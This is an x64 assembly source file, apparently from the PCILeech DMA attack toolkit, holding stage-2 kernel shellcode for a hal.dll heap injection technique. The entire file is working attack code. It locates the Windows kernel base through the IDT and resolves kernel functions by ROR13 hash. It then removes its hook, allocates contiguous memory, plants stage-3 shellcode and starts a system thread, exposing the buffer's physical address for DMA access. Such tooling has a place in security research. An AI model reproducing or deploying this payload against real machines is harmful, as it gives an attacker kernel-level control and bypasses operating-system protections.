; wx64_stage2.asm : assembly modified for the hal.dll heap injection technique.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	; ----------------------------------------------------
	; INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag		db 00h
	data_filler				db 00h
	data_phys_addr_alloc	dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_fnptr			dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_orig_fnptraddr		dq 0000000000000000h				; 16 bytes offset (8 bytes long)
	; ----------------------------------------------------
	; SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rsi
	PUSH rdi
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	; ----------------------------------------------------
	; r12 = ntos base address
	; r13 = memory address of allocated buffer
	; ----------------------------------------------------
	; SET UP STACK AND PARAMETERS
	; param0 = address of NTOS code. First entry of
	; IDT table = division by zero points into NTOSKRNL
	; ----------------------------------------------------
	SUB rsp, 020h
	SIDT [rsp]
	MOV rcx, [rsp+2]       
	MOV rcx, [rcx+4]                ; param0
	; ----------------------------------------------------
	; FETCH NTOS BASE ADDRESS
	; ----------------------------------------------------
	CALL PEGetModuleFromAddress_ScanBack
	MOV r12, rax
	; ----------------------------------------------------
	; CHECK CURRENT IRQL - ONLY IRQL PASSIVE (0) ALLOWED
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 4d90adceh			; H_KeGetCurrentIrql
	CALL PEGetProcAddressH
	CALL rax
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LOCK CMPXCHG [data_cmpxchg_flag], dl
	JNE skipcall
	; ----------------------------------------------------
	; REMOVE HOOK
	; ----------------------------------------------------
	MOV rax, [data_orig_fnptraddr]
	MOV rcx, [data_orig_fnptr]
	MOV [rax], rcx
	; ----------------------------------------------------
	; ALLOCATE 0x2000 CONTIGUOUS MEMORY BELOW 0x7fffffff
	; ----------------------------------------------------
	MOV [data_filler], 0dh		; DEBUG
	MOV rcx, r12
	MOV edx, 9f361ebch			; H_MmAllocateContiguousMemory
	CALL PEGetProcAddressH
	MOV rcx, 2000h
	MOV rdx, 7fffffffh	
	CALL rax
	MOV r13, rax
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 400h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	; ----------------------------------------------------
	; SET UP INITIAL STAGE3 SHELLCODE AND DATA
	; ----------------------------------------------------
	MOV [r13+8], r12
	MOV rax, 048FFFFFFF1058D48h
	MOV [r13+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r13+1008h], rax
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	MOV [data_filler], 0bh		; DEBUG
	PUSH 0						; maintain stack alignment
	PUSH r13
	MOV eax, 1000h
	ADD rax, r13
	PUSH rax
	PUSH 0
	SUB rsp, 020h
	MOV rcx, r12
	MOV edx, 94a06b02h			; H_PsCreateSystemThread
	CALL PEGetProcAddressH
	MOV rcx, r13
	MOV rdx, 1fffffh
	XOR r8, r8
	XOR r9, r9
	CALL rax
	ADD rsp, 040h
	; ----------------------------------------------------
	; RETRIEVE AND SET PHYSICAL ADDRESS
	; ----------------------------------------------------
	MOV [data_filler], 09h		; DEBUG
	MOV rcx, r12
	MOV edx, 5a326357h			; H_MmGetPhysicalAddress
	CALL PEGetProcAddressH	
	MOV rcx, r13
	CALL rax
	MOV [data_phys_addr_alloc], eax
	; ----------------------------------------------------
	; EXIT - RESTORE AND JMP BACK
	; ----------------------------------------------------
	MOV [data_filler], 08h		; DEBUG
	skipcall:
	ADD rsp, 020h
	POP r13
	POP r12
	POP r11
	POP r10
	POP rdi
	POP rsi
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	MOV rax, [data_orig_fnptr]
	JMP rax
main ENDP

; ----------------------------------------------------
; Perform ROR13 hashing
; rcx -> string ptr
; rax <- result
; ----------------------------------------------------
HashROR13A PROC
	PUSH rsi
	PUSH rdi
	MOV rsi, rcx
	XOR rdi, rdi
	XOR rax, rax
	CLD
	hash_loop:
	LODSB
	TEST al, al
	JZ hash_loop_finish
	ROR edi, 13
	ADD edi, eax
	JMP hash_loop
	hash_loop_finish:
	MOV eax, edi
	POP rdi
	POP rsi
	RET
HashROR13A ENDP

; ----------------------------------------------------
; Search for PE header given an address. May cause page faults.
; rcx -> scan address
; rax <- header address
; ----------------------------------------------------
PEGetModuleFromAddress_ScanBack PROC
	SHR rcx, 12
	SHL rcx, 12
	address_loop:
	MOV eax, 1000h
	SUB rcx, rax
	MOV ax, [rcx]		; dos header magic
	CMP ax, 5a4dh
	JNE address_loop
	MOV eax, [rcx+60]	; nt header address offset
	CMP eax, 1000h
	JNBE address_loop
	ADD rax, rcx		; nt header address
	MOV eax, [rax]
	CMP eax, 00004550h	; nt header magic
	JNE address_loop
	MOV rax, rcx
	RET
PEGetModuleFromAddress_ScanBack ENDP

; rcx -> module base address
; rdx -> hash of exported function
; rax <- address of exported function
PEGetProcAddressH PROC
	; rdi = PIMAGE_EXPORT_DIRECTORY
	; rsi = counter NumberOfNames
	PUSH rdi
	PUSH rsi
	MOV edi, [rcx+60]	; nt header address offset
	MOV edi, [rdi+rcx+136]
	ADD rdi, rcx		; ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule  
	MOV r8d, [rdi+24]	; PIMAGE_EXPORT_DIRECTORY->NumberOfNames
	XOR rsi, rsi
	find_loop:
	MOV eax, [rdi+32]			; PIMAGE_EXPORT_DIRECTORY->AddressOfNames
	ADD rax, rcx				; PIMAGE_EXPORT_DIRECTORY->AddressOfNames + hModule
	MOV eax, [rax+rsi*4]		; AddressOfNames[index]
	ADD rax, rcx
	PUSH rcx
	MOV rcx, rax
	CALL HashROR13A
	POP rcx
	CMP eax, edx
	JE find_loop_found
	INC rsi
	JMP find_loop
	find_loop_found:
	; found!
	MOV edx, [rdi+36]		; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals + hModule
	XOR rax, rax
	MOV ax, [rdx+rsi*2]		; AddressOfNameOrdinals[index]
	MOV edx, [rdi+28]		; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions 
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions + hModule
	MOV eax, [rdx+rax*4]	; AddressOfFunctions[index]
	ADD rax, rcx			; AddressOfFunctions[index] + hModule
	POP rsi
	POP rdi
	RET
PEGetProcAddressH ENDP

END
